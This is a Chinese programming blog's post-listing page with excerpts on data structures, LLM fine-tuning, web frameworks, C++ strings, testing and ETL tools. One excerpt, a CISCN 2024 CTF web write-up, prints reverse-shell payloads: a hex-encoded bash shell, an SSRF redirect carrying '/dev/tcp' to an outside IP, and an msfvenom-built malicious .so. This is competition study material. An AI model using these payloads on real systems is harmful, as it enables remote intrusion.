<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29afee1745cd46dcf5438971c7ece567/" rel="bookmark">
			[Collection与数据结构] Map与Set(一):二叉搜索树与Map,Set的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🌸个人主页:https://blog.csdn.net/2301_80050796?spm=1000.2115.3001.5343
🏵️热门专栏:🍕 Collection与数据结构 (91平均质量分)https://blog.csdn.net/2301_80050796/category_12621348.html?spm=1001.2014.3001.5482
🧀Java EE(94平均质量分) https://blog.csdn.net/2301_80050796/category_12643370.html?spm=1001.2014.3001.5482
🍭MySql数据库(93平均质量分)https://blog.csdn.net/2301_80050796/category_12629890.html?spm=1001.2014.3001.5482
感谢点赞与关注~~~
目录 1. 搜索树1.1 概念1.2 查找结点1.3 插入结点1.4 删除结点(难点)1.5 实现二叉搜索树1.6 性能分析1.7 和Java中Collection的关系 2. Map和Set2.1 概念与场景2.2 两种模型2.3 Map的使用2.3.1 关于Map的说明2.3.2 关于Map.Entry&lt;K,V&gt;的说明2.3.3 常用方法 2.4 Set的使用2.4.1 常用方法 1. 搜索树 1.1 概念 二叉搜索树又称为二叉排序树,它可以是一颗空树,或者是具有以下性质的二叉树.
若他的右树不为空,则它的右子树上的所有结点都大于根结点.若它的左树不为空,则它的左子树上的所有结点都小于根结点.它的左子树和右子树也分别为二叉搜索树.
1.2 查找结点 如果根节点为空,返回false.如果根结点不为空:
如果根结点key == 查找key,返回true.如果根结点key &lt; 查找key,到其右子树中查找.如果根结点key &gt; 查找key,到其左子树中查找.
1.3 插入结点 如果为空树,直接令root = 所要插入的结点.之后返回true.
如果该树不是空树,按照搜索二叉树的性质确定查找逻辑.插入新结点.注意记录cur的父节点,否则无法插入.
1.4 删除结点(难点) 设待删除的结点是cur,带删除的结点的父节点是parent.
cur的左子树为空 要删除的节点是根结点,直接令root = root.right要删除的结点是中间的结点, 单分支,parent.right = cur.right要删除的结点是中间结点,&lt;字型,parent.left = cur.right cur的右子树为空 要删除的结点是根结点,直接令root = root.left要删除的结点是中间结点,单分支,parent.left = cur.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29afee1745cd46dcf5438971c7ece567/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01f2192d0bc124a8dfca5b4b85093df5/" rel="bookmark">
			10 分钟，教你如何用 LLama-Factory 训练和微调 LLama3 模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文将探讨于2024年3月21日发布的LLama-Factory，并学习如何使用 DigitalOcean 旗下的 Paperspace平台对 LLama 3 进行微调。为了完成我们的任务，我们将使用 NVIDIA A4000 GPU，它被认为是功能最强大的单插槽 GPU 之一，能够无缝集成到各种工作站中。
RTX A4000 采用了 NVIDIA Ampere 架构，集成了 48 个第二代 RT Core、192 个第三代 Tensor Core 和 6144 个CUDA 核心，以及带有错误校正码（ECC）的 16GB 图形内存。这些配置确保了它能为创新项目提供精确可靠的计算能力。
一直以来，微调大语言模型一直是一项复杂的任务，主要由深谙机器学习和人工智能的工程师完成。然而，随着人工智能领域的不断发展，这一观念正在迅速改变。类似 LLama-Factory 等新工具的出现，使得微调过程更加便捷和高效。此外，现在还可以使用 DPO、ORPO、PPO 和 SFT 等技术进行微调和模型优化。更进一步说，大家现在可以有效地训练和微调如 LLama、Mistral、Falcon 等模型。
什么是模型的微调？ 微调模型涉及调整预训练模型或基础模型的参数，这些参数可用于特定任务或数据集，可以提高模型的性能和准确性。这个过程涉及向模型提供新数据并修改其权重、偏差和某些参数。通过这种方式，可以让这个新模型可以在新任务或数据集上获得更好的表现，而无需为了新任务或数据从头开始开发一个模型，从而节省时间和资源。
通常，当创建新的大语言模型（LLM）时，它会在大量文本数据上进行训练，这些数据可能包含潜在的有害的数据。在预训练或初始训练阶段之后，该模型会被进行微调，并采取一些安全措施，以确保其避免生成有害或有毒的响应。然而，这种方法仍有改进的空间。不过，微调解决了需要让模型适应特定需求的问题。
为什么要用 LLama-Factory？ LLama Factory，这个工具能够高效且低成本地支持对 100 多个模型进行微调。LLama Factory 简化了模型微调的过程，并且易于访问，使用体验友好。此外，它还提供了由 Hiyouga 提供的 Hugging Face 空间，可用于对模型进行微调。
图：LLama Board(Huggingface 空间)
这个空间还支持 Lora 和 GaLore 配置，以减少 GPU 的使用。用户可以通过简单的滑块轻松更改参数，如 dropout、epochs、批次大小等。同时，也有多个数据集选项可供选择以微调你的模型。正如本文所述，LLama Factory支持许多模型，包括不同版本的 LLama、mistral 和 Falcon。它还支持像 galore、badm 和 Lora 这样的高级算法，提供诸如flash attention、位置编码和缩放等各种功能。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01f2192d0bc124a8dfca5b4b85093df5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9ae3eb316d81e3d1540882e35078937/" rel="bookmark">
			Python 可视化 web 神器：streamlit、Gradio、dash、nicegui；低代码 Python Web 框架：PyWebIO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网：https://streamlit.io/
github：https://github.com/streamlit/streamlit
API 参考：https://docs.streamlit.io/library/api-reference
最全 Streamlit 教程：https://juejin.cn/column/7265946243196436520
Streamlit-中文文档：https://github.com/wanghanbinpanda/Streamlit-Documentation-Chinese/blob/main/README.md
1、Python web GUI 框架 Gradio、Streamlit、Dash、nicegui
框架对比：Gradio、Streamlit 和 Dash：https://zhuanlan.zhihu.com/p/611828558
在机器学习领域，针对已经训练好的模型创建一个快速的 Demo 通常是必要的，下面是快速创建机器学习应用的几个框架：gradio、streamit 和 dash 进行简单的对比。
gradiostreamitdash主要使用场景可交互小 Demo工作流、DashBoardDashBoard、生产环境的复杂演示应用上手难度简单简单中等组件丰富度低高高综合扩展性低中高Jupyter Notebook 内支持是否是是否完全开源是是部分企业级功能未开源github stars13.4k23.1k18.2k案例列表GitHub - gradio-app/awesome-demos: links and status of cool gradio demosApp Gallery • StreamlitDash Enterprise 2、nicegui 官网：https://nicegui.io/
github：https://github.com/zauberzeug/nicegui/
nicegui 中文文档：nicegui-reference-cn：https://zhuanlan.zhihu.com/p/661187865
在 Python 3.10 及更高版本中，collections模块被重构，MutableMapping 已经被弃用。
安装：pip install nicegui
NiceGUI 基于FastAPI，封装了Quasar、Vue、Tailwind CSS、AG Grid、ECharts等，可以用来快速开发web或桌面程序。
示例代码
from nicegui import ui ui.icon('thumb_up') ui.markdown('This is **Markdown**.') ui.html('This is &lt;strong&gt;HTML&lt;/strong&gt;.') with ui.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9ae3eb316d81e3d1540882e35078937/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7056dfa3c06c3d982f4275547f329958/" rel="bookmark">
			【爱上C&#43;&#43;】万字详解string类1：经典常用接口、操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hello，今天咱们进入C++中string类的学习，今天这部分主要讲解string类的部分经典常用接口，其他很少使用的接口要学会及时查文档，现查现用。string类的模拟实现和深浅拷贝问题放在后面一篇讲解。
目录 一.string类简介二.常见构造三.容量操作四.访问及遍历操作1.下标+[ ]2.at拓展：try,catch 异常处理3.迭代器4.范围forbegin+end,rbegin+rend 五.修改、运算操作（重点）拓展：C风格字符串与string类型字符串1.字符串连接和追加2.字符串插入3.字符串删除4.字符串替换5.字符串交换6.字符串赋值7.字符串内容访问8.字符串查找9.字符串子序列提取 六.非成员函数本篇文章思维导图 一.string类简介 string类是C++标准库中的一个类，用于处理字符串。它封装了字符数组（通常是char类型）的操作，提供了许多方便的方法来创建、修改、访问和操作字符串。使用string类可以简化字符串的编程工作，并减少常见的错误，如缓冲区溢出.
在使用string类时需要包含头文件#include&lt;string&gt; ,以及using namespace std;注意！不是C语言中是string.h
官方参考文档
上面是string类的文档介绍，在学习C++过程中，我们需要慢慢提高看英文文献，文档的能力。
字符串是表示字符序列的类标准的字符串类提供了对此类对象的支持，其接口类似于标准字符容器的接口，但添加了专门用于操作
单字节字符字符串的设计特性。string类是使用char(即作为它的字符类型，使用它的默认char_traits和分配器类型(关于模板的更多信
息，请参阅basic_string)。string类是basic_string模板类的一个实例，它使用char来实例化basic_string模板类，并用char_traits
和allocator作为basic_string的默认参数(根于更多的模板信息请参考basic_string)。注意，这个类独立于所使用的编码来处理字节:如果用来处理多字节或变长字符(如UTF-8)的序列，这个
类的所有成员(如长度或大小)以及它的迭代器，将仍然按照字节(而不是实际编码的字符)来操作。 总结：
string是表示字符串的字符串类该类的接口与常规容器的接口基本相同，再添加了一些专门用来操作string的常规操作。string在底层实际是：basic_string模板类的别名，typedef basic_string&lt;char, char_traits, allocator&gt;
string;不能操作多字节或者变长字符的序列。 二.常见构造 string类提供了多种构造函数，用于创建字符串对象。这些构造函数允许你使用不同的方式初始化字符串，如使用字符数组、其他字符串对象、单个字符、或者一定数量的字符来填充。
注意：string 类重载了流插入和流体取，所以可以直接cin,cout;
string(); //构造一个空字符串 string(const char* s); //复制s所指的字符序列 string(const char* s, size_t n); //复制s所指字符序列的前n个字符 string(size_t n, char c); //生成n个c字符的字符串 string(const string&amp; str); //生成str的复制品 string(const string&amp; str, size_t pos, size_t len = npos); //复制str中从字符位置pos开始并跨越len个字符的部分 string(const string&amp; str, size_t pos); //复制str中从pos位置开始直到末尾的字符 使用示例：
string s1;	//构造空字符串 string s2("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7056dfa3c06c3d982f4275547f329958/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b2691316638f7798ab0be5b80a40e3a/" rel="bookmark">
			【Web】CISCN 2024初赛 题解(全)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Simple_php
easycms
easycms_revenge
ezjava
mossfern
sanic
Simple_php 用php -r进行php代码执行
因为ban了引号，考虑hex2bin，将数字转为字符串
php -r eval(hex2bin(16进制));
注意下面这段报错，因为加不了引号，开头是数字的话，就会将类型识别为数字，若后续出现了字符串就会报错
用substr来截一下，从而将类型转换为字符串
cmd=php -r $a=substr(Z62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122,1);system(hex2bin($a)); 反弹shell后进行当前目录的查找
flag不在web目录下
去查数据库拿到flag
easycms 提示打SSRF
https://m.xunruicms.com/bug/ 在$thumb处传入url即可访问
不能直接传127.0.0.1，打302 ?s=api&amp;c=api&amp;m=qrcode&amp;text=xxx&amp;size=1024&amp;level=1&amp;thumb=http://124.222.136.33:1338/302.php 302.php
&lt;?php header("Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.222.136.33%2F1337%200%3E%261%22"); 反弹shell
根目录下./readflag easycms_revenge 和上题一样，改一下302.php的内容
GIF89a &lt;html&gt; &lt;?php header("Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.222.136.33%2F1337%200%3E%261%22");?&gt; &lt;/html&gt; 这里注意细节，靶机发了两次请求，第一次我们就返回一个正常的图片，第二次请求就发一个302，php代码块要用html标签包裹
ezjava /app/BOOT-INF/lib下删了jackson，不然就能直接打POJONode
依赖里有AspectJWeaver，打任意文件写入
【Web】浅聊Java反序列化之AspectJWeaver——任意文件写入-CSDN博客
后续还可以配合sqlite加载恶意so文件
JavaSec/9.JDBC Attack/SQLite/index.md at main · Y4tacker/JavaSec · GitHub
然后AJ链子的入口要调用map.put
自定义类UserBean#readObject就可以配合利用
最终思路就是先mysql打入恶意反序列化数据写入so文件，再sqlite加载恶意so文件
生成恶意so文件
msfvenom -p linux/x64/exec CMD='echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjEzNi4zMy8xMzM3IDA+JjEi|base64 -d|bash' -f elf-so -o evil.so 将生成的恶意序列化数据写入output.ser
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b2691316638f7798ab0be5b80a40e3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/036b226e4c27a021753633b30b777f11/" rel="bookmark">
			Mac 存储空间里面的”系统数据”怎么清理？ 极简有效一步清理, 释放200G空间, 爽
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概要: mac “系统数据“太大 莫名占了 ＞ 250G, 一步操作释放200g
系统提示占用磁盘不足, 500G的硬盘突然只剩3g, 点进去查看, 发现"系统数据"占了256G.
之前清理若干次, 基本上把一些自己下载的大文件都干掉了, 但还是经常报这个问题, 而且自己真没用多少磁盘, 网上搜方法都是让清cache或者清资源库, 但效果不佳. 使用du -sh ./* 从根目录逐步分析每个文件夹的大小, 发现/System/Volumes/Data/cores占了200G, 很奇怪, 查了下该文件夹的用途. 感觉基本上就是这个文件夹就是根因, 确认可以删除后, 将该文件夹清空. 重新扫描, "系统数据"还剩44G, 释放了200G, 效果超好, 很爽.
避免以后类似无用文件产生: - 设置core文件不保存
sudo launchctl limit core 0 0 后记：
2024年 5月20日 星期一
新换了电脑，型号： Apple M2 Pro 14.2 (23C64) 然后该问题变得愈发猖獗， 不知道咋回事，core文件一直在创建， 每天不定时收到磁盘不足，导致一切操作都不行，有时甚至没空间打开iterm做操作，只能先删除点文件，再打开iterm删除/System/Volumes/Data/cores下的文件
烦不胜烦
而且上面的“设置core文件不保存”，未有任何效果，查不到如何禁用。
为了避免每天都要记着手动删除core的体力操作，最后想了个定时任务清理。
#!/bin/bash echo "start" cd /System/Volumes/Data/cores rm -rf /System/Volumes/Data/cores/core* echo "all.file:" ls 设置定时任务操作：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/036b226e4c27a021753633b30b777f11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c479844c03a2cd65608f9d8c6c92b2f2/" rel="bookmark">
			小程序与内嵌webview的数据交互
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 小程序与内嵌webview的数据交互 一、目的 我们要就将h5切换到小程序，由于时间问题，一些页面不得不通过webvie承接，所以这就涉及到h5和webview交互的问题。（后期把大部分需要交互的页面迁移到小程序了，这都小问题。）最重要的就是低码c端填报页（表单）由于技术问题无法迁移到小程序，必须通过webview承接，里边有一个地图定位组件需要在小程序中实现，最后携带定位数据到表单中回填，这里面有几个关键点 小程序定位结束，携带数据到表单回填的时候不刷新表单，需要保留表单已经填的内容h5与小程序的数据传递。 二、技术方案 小程序针对webview其实是出了一套数据交互的方案(postMessage)，具体可以参考官网web-view
但是它只有在 小程序后退、组件销毁、分享、复制链接 这几种特定情况下小程序webview中才能接收到。结果多方面研究调查，最终确定了下面的方法。
1.h5引入sdk，通过skd中的方法做页面跳转并携带参数，因为我们是低码平台，表单是动态的，所以这块携带定位数据、组件key（数据回填时能准确找到）。2.在小程序做定位结束之后，重定向到一个h5的中间页，参数拼接在url上边，在中间页做一下几个处理。 a.获取到url参数key和val，将key和val缓存到localStorage（分别存分两个）
if (route.query.key) { window.localStorage.setItem(loactionComponentKey, `${route.query.key}`) window.localStorage.setItem( `${loactionComponentValuePrefix}${route.query.key}`, `${route.query.value}` ) } b.然后做goback，因为页面有缓存，在页面回退之后表单值还存在，注意：在这个地方要用 小程序sdk中的回退navigateBack
3.在表单页监听localStorage，获取localStorage中的表单值，做表单回填。 // 单独页面组件 渲染赋值 window.addEventListener('storage', function (e) { const locKey = window.localStorage.getItem(loactionComponentKey) if (!locKey) return const value = window.localStorage.getItem(`${loactionComponentValuePrefix}${locKey}`) if (locKey &amp;&amp; value) { // setValue window.localStorage.removeItem(`${loactionComponentValuePrefix}${locKey}`) window.localStorage.removeItem(loactionComponentKey) } }) 如果是hash模式的路由跳转用不着这么麻烦，改变路径参数不会触发页面刷新，所以可以通过修改webview的url就能实现了。
三、总结 1、需要三个页面 h5、h5中间页、小程序2、h5-&gt;小程序 通过sdk的方法跳转 携带参数 小程序在 onload 中获取参数3、小程序-&gt;h5中间页 通过sdk的方法重定向 携带路径参数 存到story4、h5中间页-&gt;h5 使用sdk方法回退5、h5 监听story，做数据处理 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a748c120135eca0627c0c3b4985e917/" rel="bookmark">
			pytest
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习视频 https://www.bilibili.com/video/BV1py4y1t7bJ/?spm_id_from=333.337.search-card.all.click&amp;vd_source=5d1d6a8d64d590dd81191ca4c12bf2f2
pytest插件 pytest-html （生成html格式的测试报告）
pytest-xdist 测试用例分布式执行，多cpu分发
pytest-ordering 用于改变用例执行的顺序
pytest-rerunfailures 用例失败后重跑
allure-pytest 用于生成美观的测试报告
使用规范 1、模块名必须以test_开头或者_test结尾
2、测试必须以Test开头，并且不能有init方法
3、测试方法必须以test开头
运行 指定运行目录： pytest -vs testcase
指定运行方法： pytest -vs testcase/test_interface.py::test_04_func
多线程运行： pytest -vs testcase -n 2
失败重跑： pytest -vs testcase --reruns 2
跳过用例： pytest -vs testcase -k “ao” 只执行包含ao字符串的测试用例
执行顺序： 默认执行顺序从上往下，@pytest.mark.run(order=1) 指定执行顺序
配置运行规则，pytest.ini放在根目录下
[pytest] addopts = -vs --html ./report/report.html # 命令行的参数，用空格分隔 testpaths = ./testcase # 测试用例执行的路径 python_files = test_*.py # 模块名的规则 python_classes = Test* # 配置执行的测试类名 python_functions = test # 配置执行的函数名 markers = smoke: smoke usermanage: usermanage 如果报unicodeDecodeError: ‘gbk’ … 需要把注释删掉，然后用notepad++将文件编码转为ANSI
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a748c120135eca0627c0c3b4985e917/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b77865992544a2df3e7682b7cf3d89cb/" rel="bookmark">
			大数据ETL工具对比——SeaTunnel、DataX、Sqoop、Flume、Flink CDC、Dlinky、TIS、Chunjun等对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、简介1.1、Apache SeaTunnel1.1.1、简介1.1.2、官方地址1.1.3、软件架构 1.2、Alibaba DataX1.2.1、简介1.2.2、官方地址1.2.3、软件架构 1.3、Apache Sqoop1.3.1、简介1.3.2、官方地址1.3.3、软件架构 1.4、Apache Flume1.4.1、简介1.4.2、官方地址1.4.3、软件架构 1.5、Apache Flink CDC1.5.1、简介1.5.2、官网地址1.5.3、软件架构 1.6、Dinky1.6.1、简介1.6.2、官网地址1.6.3、软件架构 1.7、TIS1.7.1、简介1.7.2、官网地址1.7.3、软件架构 1.8、Chunjun1.8.1、简介1.8.2、官网地址1.8.3、软件架构 2、总结 1、简介 1.1、Apache SeaTunnel 1.1.1、简介 Apache SeaTunnel作为下一代数据集成平台。同时也是数据集成一站式的解决方案，有下面这么几个特点。
特性：
丰富且可扩展的Connector：SeaTunnel提供了不依赖于特定执行引擎的Connector API。 基于该API开发的Connector（Source、Transform、Sink）可以运行在很多不同的引擎上，例如目前支持的SeaTunnel Engine、Flink、Spark等。Connector插件：插件式设计让用户可以轻松开发自己的Connector并将其集成到SeaTunnel项目中。 目前，SeaTunnel 支持超过 100 个连接器，并且数量正在激增。 这是[当前支持的连接器]的列表(Connector-v2-release-state.md)批流集成：基于SeaTunnel Connector API开发的Connector完美兼容离线同步、实时同步、全量同步、增量同步等场景。 它们大大降低了管理数据集成任务的难度。支持分布式快照算法，保证数据一致性。多引擎支持：SeaTunnel默认使用SeaTunnel引擎进行数据同步。 SeaTunnel还支持使用Flink或Spark作为Connector的执行引擎，以适应企业现有的技术组件。 SeaTunnel 支持 Spark 和 Flink 的多个版本。JDBC复用、数据库日志多表解析：SeaTunnel支持多表或全库同步，解决了过度JDBC连接的问题； 支持多表或全库日志读取解析，解决了CDC多表同步场景下需要处理日志重复读取解析的问题。高吞吐量、低延迟：SeaTunnel支持并行读写，提供稳定可靠、高吞吐量、低延迟的数据同步能力。完善的实时监控：SeaTunnel支持数据同步过程中每一步的详细监控信息，让用户轻松了解同步任务读写的数据数量、数据大小、QPS等信息。支持两种作业开发方法：编码和画布设计。 SeaTunnel Web 项目 https://github.com/apache/seatunnel-web 提供作业、调度、运行和监控功能的可视化管理。 1.1.2、官方地址 官网地址 https://seatunnel.apache.org/ 项目地址 https://github.com/apache/seatunnel https://github.com/apache/seatunnel-web 1.1.3、软件架构 1.2、Alibaba DataX 1.2.1、简介 DataX本身作为数据同步框架，将不同数据源的同步抽象为从源头数据源读取数据的Reader插件，以及向目标端写入数据的Writer插件，理论上DataX框架可以支持任意数据源类型的数据同步工作。同时DataX插件体系作为一套生态系统, 每接入一套新数据源该新加入的数据源即可实现和现有的数据源互通。
特性：
可靠的数据质量监控：完美解决数据传输个别类型失真问题，提供作业全链路的流量、数据量运行时监控，提供脏数据探测。丰富的数据转换功能：DataX作为一个服务于大数据的ETL工具，除了提供数据快照搬迁功能之外，还提供了丰富数据转换的功能，让数据在传输过程中可以轻松完成数据脱敏，补全，过滤等数据转换功能，另外还提供了自动groovy函数，让用户自定义转换函数。详情请看DataX3的transformer详细介绍。精准的速度控制：新版本DataX3.0提供了包括通道(并发)、记录流、字节流三种流控模式，可以随意控制作业速度，让作业在库可以承受的范围内达到最佳的同步速度。强劲的同步性能：DataX3.0每一种读插件都有一种或多种切分策略，都能将作业合理切分成多个Task并行执行，单机多线程执行模型可以让DataX速度随并发成线性增长。在源端和目的端性能都足够的情况下，单个作业一定可以打满网卡。另外，DataX团队对所有的已经接入的插件都做了极致的性能优化，并且做了完整的性能测试。性能测试相关详情可以参照每单个数据源的详细介绍：DataX数据源指南健壮的容错机制：DataX作业是极易受外部因素的干扰，网络闪断、数据源不稳定等因素很容易让同步到一半的作业报错停止。因此稳定性是DataX的基本要求，在DataX 3.0的设计中，重点完善了框架和插件的稳定性。目前DataX3.0可以做到线程级别、进程级别(暂时未开放)、作业级别多层次局部/全局的重试，保证用户的作业稳定运行。包括线程内部重试和线程级别重试。极简的使用体验：易用，详细，DataX在运行日志中打印了大量信息，其中包括传输速度，Reader、Writer性能，进程CPU，JVM和GC情况等等。 1.2.2、官方地址 官网地址 https://github.com/alibaba/DataX/blob/master/introduction.md 项目地址 https://github.com/alibaba/DataX.git 1.2.3、软件架构 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b77865992544a2df3e7682b7cf3d89cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5edd015a66f3a236012893995fc9e4db/" rel="bookmark">
			基于springboot3基本使用knife4j-openapi3-jakarta-spring-boot-starter
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		knife4j的使用 1.创建springboot项目1.1准备数据库数据1.2创建maven项目并导入需要的坐标1.3创建包和启动类1.4编写配置文件，实体类1.5编写mapper接口使其继承baseMapper1.6编写service层代码1.7编写统一返回结果代码和controller层代码 2.配置knife4j2.1引入坐标2.2 编写配置文件2.3编写配置类 3.knif4j配置详解3.1配置文件详解3.2 配置类内容讲解3.3常用注解介绍3.4使用mybatis-plus完成增删改查 1.创建springboot项目 1.1准备数据库数据 # 创建数据库 create database if not exists student; use student; create table student( id int auto_increment primary key , name varchar(20) comment '姓名', account varchar(10) comment '账号', password varchar(20) comment '密码', phone varchar(11) comment '联系方式', age int comment '年龄', gender varchar(1) comment '性别', stu_class varchar(10) comment '班级', id_deleted int default 0 comment '是否删除' )comment '学生信息表'; 1.2创建maven项目并导入需要的坐标 &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/parent&gt; &lt;properties&gt; &lt;maven.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5edd015a66f3a236012893995fc9e4db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2d107ee83421b85b81a99852ad17e99/" rel="bookmark">
			前端流式播放TTS语音：技术细节与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要 本文将介绍如何在前端实现流式播放文本到语音（TTS）的语音，并加入确保语音播放不重叠的改进方案。我们将探讨使用Web Audio API和WebSocket进行实时语音播放的技术细节，并提供相应的代码示例。
一、引言 在之前的讨论中，我们了解了如何实现前端流式播放TTS语音。然而，为了进一步提升用户体验，我们需要确保语音播放不会重叠。本文将介绍一种基于状态管理和播放队列的改进方案。
二、技术细节 2.1 Web Audio API Web Audio API提供了强大的音频处理功能，包括创建音频上下文、加载和播放音频、以及音频的实时处理。
2.2 WebSocket WebSocket允许在用户和服务器之间建立持久的全双工通信渠道，非常适合实时的TTS语音流式传输。
三、改进方案 3.1 维护音频播放状态 通过增加一个状态变量isPlaying，我们可以跟踪当前是否有音频正在播放。
3.2 音频播放队列 创建一个audioQueue数组，用于存储待播放的音频数据。
3.3 播放队列管理 在当前音频播放结束后，自动从队列中取出下一个音频进行播放。
四、代码示例 4.1 Vue组件数据 data() { return { // ... 其他属性 isPlaying: false, // 标记音频是否正在播放 audioQueue: [], // 存储待播放的音频数据 audioContext: null, source: null, }; }, 4.2 WebSocket连接与文本请求 // WebSocket连接代码保持不变 // ... function sendTextToTTS(text) { socket.send(text); } 4.3 处理音频数据并加入队列 handleAudioData(audioData) { // 创建FileReader读取音频数据 const reader = new FileReader(); reader.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2d107ee83421b85b81a99852ad17e99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01a2404aa2fc7176ea727efc89ee5717/" rel="bookmark">
			探索AI世界：向AI提问的艺术与技巧 — 解锁AI大语言模型的潜力
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		💂 个人网站:【 摸鱼游戏】【神级代码资源网站】【工具大全】🤟 一站式轻松构建小程序、Web网站、移动应用：👉注册地址🤟 基于Web端打造的：👉轻量化工具创作平台💅 想寻找共同学习交流，摸鱼划水的小伙伴，请点击【全栈技术交流群】 探索AI世界：向AI提问的艺术与技巧
在当今信息爆炸的时代，人工智能已经成为我们生活中不可或缺的一部分。无论是智能语音助手、智能推荐系统还是智能客服，在各个领域，AI都展现出了惊人的能力。然而，与AI交流并不仅仅是简单地输入问题和获取答案，更是一门艺术。《探索AI世界：向AI提问的艺术与技巧》一书深入剖析了这门艺术，为您揭开了AI世界的神秘面纱。
解锁与AI大语言模型进行有效沟通的技术、方法与步骤，将AI转化成生产力！
这本书不仅仅是一本技术指南，更是一本引领您走进AI世界的指南。它从ChatGPT基本原理及提示工程的基本概念讲起，逐步引领您深入了解AI的运作机制和应用技巧。通过实例生动地展示了如何运用这些技巧，还深度解析了各种技巧的使用场景及其潜在局限性。
借助AI，实现高效学习和工作，提高生产力！
这本书的卖点之一是它力求实用和好用，帮助读者将AI转化成生产力。无论您是开发人员、产品经理、创业者，还是对新兴技术感兴趣的读者，都能从中受益。它详细介绍了提示工程技巧，涵盖有效提示编写、针对复杂任务的提示设计技巧、对话中的提示设计技巧，以及提示的优化与迭代。通过逐步学习，您将能够掌握各种场景下的提示设计方法，有效提高学习和工作效率。
深入探讨AI世界，丰富案例助您理解应用
